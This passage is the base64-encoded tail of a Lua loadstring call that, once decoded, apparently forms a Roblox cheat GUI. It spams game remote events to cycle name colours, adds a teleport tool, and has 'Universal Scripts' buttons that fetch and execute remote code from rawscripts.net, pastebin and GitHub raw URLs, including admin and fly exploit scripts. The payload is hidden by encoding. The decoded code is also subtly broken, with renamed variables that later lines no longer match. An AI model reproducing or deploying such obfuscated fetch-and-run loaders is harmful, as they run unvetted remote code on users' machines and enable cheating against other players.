0gIlJHQiBOYW1lcyIKfSkKClRhYjpBZGRUb2dnbGUoewogICAgTmFtZSA9ICJSR0IgTmFtZSIsCiAgICBEZXNjcmlwdGlvbiA9ICJpZGsiLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBpc05hbWVBY3RpdmUgPSB2YWx1ZQogICAgICAgIHByaW50KHZhbHVlIGFuZCAiUkdCIE5hbWUgYWN0aXZhdGVkIiBvciAiUkdCIE5hbWUgZGVhY3RpdmF0ZWQiKQogICAgZW5kCn0pCgoKbG9jYWwgdmFyX2NvaDF3dCA9IFRhYjpBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSAiUkdCIEJJTyIKfSkKClRhYjpBZGRUb2dnbGUoewogICAgTmFtZSA9ICJSR0IgQklPIiwKICAgIERlc2NyaXB0aW9uID0gImlkayIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIGlzQmlvQWN0aXZlID0gdmFsdWUKICAgICAgICBwcmludCh2YWx1ZSBhbmQgIlJHQiBCSU8gYWN0aXZhdGVkIiBvciAiUkdCIEJJTyBkZWFjdGl2YXRlZCIpCiAgICBlbmQKfSkKCgpsb2NhbCB2YXJfYWcxemJ3ID0gewogICAgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSwgICAtLSBSZWQKICAgIENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCksICAgLS0gR3JlZW4KICAgIENvbG9yMy5mcm9tUkdCKDAsIDAsIDI1NSksICAgLS0gQmx1ZQogICAgQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDApLCAtLSBZZWxsb3cKICAgIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMjU1KSwgLS0gTWFnZW50YQogICAgQ29sb3IzLmZyb21SR0IoMCwgMjU1LCAyNTUpLCAtLSBDeWFuCiAgICBDb2xvcjMuZnJvbVJHQigyNTUsIDE2NSwgMCksIC0tIE9yYW5nZQogICAgQ29sb3IzLmZyb21SR0IoMTI4LCAwLCAxMjgpLCAtLSBQdXJwbGUKICAgIENvbG9yMy5mcm9tUkdCKDI1NSwgMjAsIDE0NykgLS0gSG90IFBpbmsKfQoKc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIGlmIGlzTmFtZUFjdGl2ZSB0aGVuCiAgICAgICAgICAgIGxvY2FsIHZhcl80MDgxb28gPSB2aWJyYW50Q29sb3JzW21hdGgucmFuZG9tKCN2aWJyYW50Q29sb3JzKV0KICAgICAgICAgICAgbG9jYWwgdmFyXzVyMDJzNiA9IHsKICAgICAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nUlBOYW1lQ29sb3IiLAogICAgICAgICAgICAgICAgWzJdID0gcmFuZG9tQ29sb3IKICAgICAgICAgICAgfQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFSUE5hbTFlQ29sbzFyIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgZW5kCiAgICAgICAgd2FpdCgwLjcpCiAgICBlbmQKZW5kKQoKc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIGlmIGlzQmlvQWN0aXZlIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyX25uYm90ciA9IHZpYnJhbnRDb2xvcnNbbWF0aC5yYW5kb20oI3ZpYnJhbnRDb2xvcnMpXQogICAgICAgICAgICBsb2NhbCB2YXJfdHZndzV1ID0gewogICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdSUEJpb0NvbG9yIiwKICAgICAgICAgICAgICAgIFsyXSA9IHJhbmRvbUNvbG9yCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxUlBOYW0xZUNvbG8xciIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGVuZAogICAgICAgIHdhaXQoMC43KQogICAgZW5kCmVuZCkKCmxvY2FsIHZhcl9lZmVhcTEgPSBUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIkFkZCBuYW1lcyB0byBwbGF5ZXIiCn0pCgpsb2NhbCB2YXJfemxyNWVwID0gewogICAgeyJBbm9ueW11cyIsICIgQW5vbnltdXMgIn0sCiAgICB7IlBybyIsICIgUHJvICJ9LAogICAgeyJFcnIwcl85NjYiLCAiIGVycjByXzk2NiAifSwKICAgIHsiRGFya25lMXNzcyIsICIgRGFya25lMXNzcyAifSwKICAgIHsiR2hvc3QiLCAiIEdob3N0ICJ9LAogICAgeyJUVUJFUlM5MyIsICIgVFVCRVJTIDkzICJ9LAogICAgeyJUZWFtIFZlbnNlIGh1YiIsICIgVGVhbSBWZW5zZSBodWIifSwKICAgIHsiQW50aVdlYiIsICIgQW50aVdlYiJ9LCAgIAp9Cgpmb3IgXywgbmFtZSBpbiBpcGFpcnMobmFtZXMpIGRvCiAgICBUYWI6QWRkQnV0dG9uKHsKICAgICAgICBOYW1lID0gIk5hbWU6ICIgLi4gbmFtZVsxXSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFWyIxUlBOYW0xZVRleDF0Il06RmlyZVNlcnZlcigiUm9sZVBsYXlOYW1lIiwgbmFtZVsyXSkKICAgICAgICBlbmQKICAgIH0pCmVuZAoKbG9jYWwgdmFyX3A4aWxieCA9IFdpbmRvdzpNYWtlVGFiKHsiVW5pdmVyc2FsIFNjcmlwdHMiLCAicGxhbmUifSkKCi0tIFNl5+NvIHBhcmEgU2NyaXB0cyBVbml2ZXJzYWlzClNlY3Rpb24gPSBVbml2ZXJzYWxUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIlVuaXZlcnNhbCBTY3JpcHRzIgp9KQoKLS0gQm90428gcGFyYSBSYWVsIEh1YiBCcm9vawpVbml2ZXJzYWxUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiUmFlbCBIdWIgQnJvb2siLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3c2NyaXB0cy5uZXQvcmF3L1RoZS1NaW1pYy1SYWVsLUh1Yi0yMDkyMSIpKSgpCiAgICBlbmQKfSkKCi0tIEJvdONvIHBhcmEgU2hpZnRMb2NrClVuaXZlcnNhbFRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJTaGlmdExvY2siLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9OMnRpSGd5diIpKSgpCiAgICBlbmQKfSkKCi0tIEJvdONvIHBhcmEgR2hvc3QgSHViClVuaXZlcnNhbFRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJHaG9zdCBIdWIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3c2NyaXB0cy5uZXQvcmF3L1VuaXZlcnNhbC1TY3JpcHQtR2hvc3RIdWItMTY1MzQiKSkoKQogICAgZW5kCn0pCgotLSBCb3TjbyBwYXJhIEluZmluaXRlIFlpZWxkClVuaXZlcnNhbFRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJJbmZpbml0ZVlpZWxkIC0gQ21kIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRWRnZUlZL2luZmluaXRleWllbGQvbWFzdGVyL3NvdXJjZSIpKSgpCiAgICBlbmQKfSkKCi0tIEJvdONvIHBhcmEgVFAgVG9vbApVbml2ZXJzYWxUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiVFAgVG9vbCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBtb3VzZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcjpHZXRNb3VzZSgpCnRvb2wgPSBJbnN0YW5jZS5uZXcoIlRvb2wiKQp0b29sLlJlcXVpcmVzSGFuZGxlID0gZmFsc2UKdG9vbC5OYW1lID0gIlRwIHRvb2wiCnRvb2wuQWN0aXZhdGVkOmNvbm5lY3QoZnVuY3Rpb24oKQpsb2NhbCB2YXJfbDcwbmNiID0gbW91c2UuSGl0K1ZlY3RvcjMubmV3KDAsMi41LDApCnBvcyA9IENGcmFtZS5uZXcocG9zLlgscG9zLlkscG9zLlopCmdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBwb3MKZW5kKQp0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjayAgICAgCiAgICBlbmQKfSkKCi0tIEJvdONvIHBhcmEgRmx5IEd1aQpVbml2ZXJzYWxUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiIE9QIEZseSBHdWkiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCi0tW1sKCVdBUk5JTkc6IEhlYWRzIHVwISBUaGlzIHNjcmlwdCBoYXMgbm90IGJlZW4gdmVyaWZpZWQgYnkgU2NyaXB0QmxveC4gVXNlIGF0IHlvdXIgb3duIHJpc2shCl1dCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZmhyZGlteWJkcy1ieXRlL09QLUZMWS1HVUktL3JlZnMvaGVhZHMvbWFpbi9MdWEiKSkoKQogICAgZW5kCn0pCgotLSBCb3TjbyBwYXJhIE5hbWVsZXNzIEFkbWluIApVbml2ZXJzYWxUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiTmFtZWxlc3MgQWRtaW4gLSBDbWQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9GaWx0ZXJpbmdFbmFibGVkL05hbWVsZXNzQWRtaW4vbWFpbi9Tb3VyY2UiKSkoKQogICAgZW5kCn0pCgoKVW5pdmVyc2FsVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIlRlbGVraW5lc2lzIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU0FaWEhVQi9Db250cm9sLXVwZGF0ZS9tYWluL1JFQURNRS5tZCIsIHRydWUpKSgpCiAgICBlbmQKfSk='))()
